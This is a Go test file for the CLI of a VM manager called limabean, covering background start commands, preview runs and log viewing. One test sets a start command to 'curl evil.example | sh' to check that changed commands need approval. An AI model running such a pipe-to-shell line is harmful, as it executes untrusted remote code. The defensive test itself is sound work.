package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rossedman/limabean/internal/ui"
)

func TestUpStart(t *testing.T) {
	h := newHarness(t)
	t.Setenv("LIMABEAN_CODE_DISK", "")
	file := projectFile(t, "web", "repo: me/web\nstart: |\n  docker compose up -d\n  npm run dev\n")
	h.world.ghq = "/home/me.linux/code/github.com/me/web\n"

	// On create: in the plan, then started in the clone, detached.
	out := h.must("", "up", "--file", file, "--yes")
	started := h.world.sshStdin["web.start"]
	if !strings.Contains(out, "start, run in the background after every up:") || !strings.Contains(out, "Started in the background: docker compose up -d") ||
		!strings.Contains(started, "cd '/home/me.linux/code/github.com/me/web'") || !strings.Contains(started, "setsid nohup bash -ec 'docker compose up -d\nnpm run dev\n'") ||
		!strings.Contains(started, `ps -o stat= -p "$(cat "$d/start.pid" 2>/dev/null)"`) {
		t.Fatalf("create:\n%s\n%s", out, started)
	}

	// Every up starts it again, unless it's still running.
	delete(h.world.sshStdin, "web.start")
	h.world.vms["web"] = "Stopped"
	if out := h.must("", "up", "--file", file); !strings.Contains(out, "up to date") || h.world.sshStdin["web.start"] == "" {
		t.Fatalf("again:\n%s", out)
	}
	h.world.startRunning = true
	if out := h.must("", "up", "--file", file); !strings.Contains(out, "start is still running from before") {
		t.Errorf("running:\n%s", out)
	}
	h.world.startRunning = false

	// Changed start commands are shown and need a yes, like any change.
	rewrite(t, file, "repo: me/web\nstart: curl evil.example | sh\n")
	out, err := h.run("", "up", "--file", file)
	if err == nil || !strings.Contains(out, "curl evil.example | sh") {
		t.Fatalf("changed start without --yes: %v\n%s", err, out)
	}
	delete(h.world.sshStdin, "web.start")
	if out, err := h.runTTY([]string{"n"}, "up", "--file", file); err != nil || !strings.Contains(out, "start changed and wasn't approved") || h.world.sshStdin["web.start"] != "" {
		t.Fatalf("declined: %v\n%s", err, out)
	}
	h.must("", "up", "--file", file, "--yes")
	if !strings.Contains(h.world.sshStdin["web.start"], "curl evil.example") {
		t.Errorf("approved start didn't run")
	}

	// No start any more: a change too, and nothing runs.
	rewrite(t, file, "repo: me/web\n")
	delete(h.world.sshStdin, "web.start")
	if out := h.must("", "up", "--file", file, "--yes"); !strings.Contains(out, "start: none") || h.world.sshStdin["web.start"] != "" {
		t.Errorf("removed:\n%s", out)
	}
	if _, err := os.Stat(filepath.Join(os.Getenv("XDG_STATE_HOME"), "limabean", "web.start")); err == nil {
		t.Error("the approval should be forgotten")
	}
}

func TestUpStartWithoutAClone(t *testing.T) {
	h := newHarness(t)
	t.Setenv("LIMABEAN_CODE_DISK", "")
	file := projectFile(t, "home", "start: ./serve\n")
	h.must("", "up", "--file", file, "--yes")
	if s := h.world.sshStdin["home.start"]; !strings.Contains(s, " && cd && {") {
		t.Errorf("start without a clone runs in the home directory: %s", s)
	}
	// A repo the VM doesn't have: a warning, and the home directory.
	rewrite(t, file, "repo: me/gone\nstart: ./serve\n")
	if out := h.must("", "up", "--file", file); !strings.Contains(out, "start runs in the home directory") {
		t.Errorf("missing clone:\n%s", out)
	}
}

func TestUpDryRun(t *testing.T) {
	h := newHarness(t)
	t.Setenv("LIMABEAN_CODE_DISK", "")
	file := projectFile(t, "dry", "cpus: 2\n")

	// No VM: the plan, and nothing made.
	if out := h.must("", "up", "--file", file, "--preview"); !strings.Contains(out, "Nothing created (--preview)") || len(h.world.vms) != 0 {
		t.Fatalf("create:\n%s", out)
	}
	h.must("", "up", "--file", file, "--yes")
	h.world.vms["dry"] = "Stopped"
	if out := h.must("", "up", "--file", file, "--preview"); !strings.Contains(out, "dry is up to date") || h.world.vms["dry"] != "Stopped" {
		t.Errorf("up to date:\n%s", out)
	}

	// Changes and refusals are listed; nothing is applied or started.
	rewrite(t, file, "cpus: 4\nnetwork:\n  allow: [github]\n")
	h.world.calls = nil
	out := h.must("", "up", "--file", file, "--preview")
	if !strings.Contains(out, "cpus: 2 → 4") || !strings.Contains(out, "Nothing changed (--preview)") || h.world.called("limactl edit") || h.world.vms["dry"] != "Stopped" {
		t.Fatalf("changes:\n%s\n%v", out, h.world.calls)
	}
	h.must("", "up", "--file", file, "--yes")
	rewrite(t, file, "cpus: 4\nnetwork:\n  allow: [github, npm]\n")
	if out := h.must("", "up", "--file", file, "--preview"); !strings.Contains(out, "limabean network allow dry") {
		t.Errorf("widening:\n%s", out)
	}

	// A VM by name.
	chdirTemp(t)
	if out := h.must("", "up", "dry", "--preview"); !strings.Contains(out, "Would start dry") {
		t.Errorf("named:\n%s", out)
	}
	if _, err := h.run("", "up", "newone", "--preview"); err == nil || !strings.Contains(err.Error(), "--preview") {
		t.Errorf("new VM: %v", err)
	}
}

func TestLogs(t *testing.T) {
	h := newHarness(t)
	t.Setenv("LIMABEAN_CODE_DISK", "")
	chdirTemp(t)
	h.world.vms["dev"] = "Running"
	h.world.logText = "Cloud-init finished\n"

	if out := h.must("", "logs", "dev"); out != "Cloud-init finished\n" || !h.world.called(`ssh -F /lima/dev/ssh.config -o BatchMode=yes lima-dev sudo -n tail -n 100 "/var/log/cloud-init-output.log"`) {
		t.Fatalf("provisioning:\n%q\n%v", out, h.world.calls)
	}
	h.must("", "logs", "dev", "--setup", "-n", "5")
	h.must("", "logs", "dev", "--start", "-f")
	calls := strings.Join(h.world.calls, "\n")
	if !strings.Contains(calls, `tail -n 5 "$HOME/.local/state/limabean/setup.log"`) || !strings.Contains(calls, `exec ssh dev tail -n 100 -F "$HOME/.local/state/limabean/start.log"`) {
		t.Fatalf("setup and start:\n%s", calls)
	}

	h.world.logErr = true
	for args, want := range map[string]string{
		"logs dev":         "a locked VM has no sudo",
		"logs dev --setup": "no setup log yet",
		"logs dev --start": "no start log yet",
	} {
		if _, err := h.run("", strings.Fields(args)...); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: %v", args, err)
		}
	}
	h.world.logErr = false

	// Lima's log is on the Mac, so it works for a stopped VM.
	dir := filepath.Join(h.world.limaHome, "dev")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "ha.stderr.log"), []byte("one\ntwo\nthree\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	h.world.vms["dev"] = "Stopped"
	if out := h.must("", "logs", "dev", "--lima", "-n", "2"); out != "two\nthree\n" {
		t.Errorf("--lima: %q", out)
	}
	for args, want := range map[string]string{
		"logs dev":                 "dev is stopped",
		"logs dev --lima -f":       "tail -f",
		"logs dev --setup --start": "pick one",
		"logs dev -n 0":            "-n needs",
		"logs gone --lima":         "gone",
		"logs":                     "name the VM: limabean logs <name>",
	} {
		if _, err := h.run("", strings.Fields(args)...); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: %v, want %q", args, err, want)
		}
	}
	if err := os.Remove(filepath.Join(dir, "ha.stderr.log")); err != nil {
		t.Fatal(err)
	}
	if _, err := h.run("", "logs", "dev", "--lima"); err == nil || !strings.Contains(err.Error(), "no Lima log") {
		t.Errorf("no Lima log: %v", err)
	}

	// In a project: its VM, or a note that there's none yet.
	file := projectFile(t, "proj", "")
	if err := os.Chdir(filepath.Dir(file)); err != nil {
		t.Fatal(err)
	}
	if out := h.must("", "logs"); !strings.Contains(out, "proj has no VM yet") {
		t.Errorf("no VM:\n%s", out)
	}
	h.must("", "up", "--yes")
	if out := h.must("", "logs"); out != "Cloud-init finished\n" {
		t.Errorf("project:\n%q", out)
	}

	// In a terminal, outside a project, a picker.
	chdirTemp(t)
	h.world.vms["dev"] = "Running"
	if _, err := h.runTTY([]string{ui.Enter}, "logs"); err != nil {
		t.Errorf("picker: %v", err)
	}
}
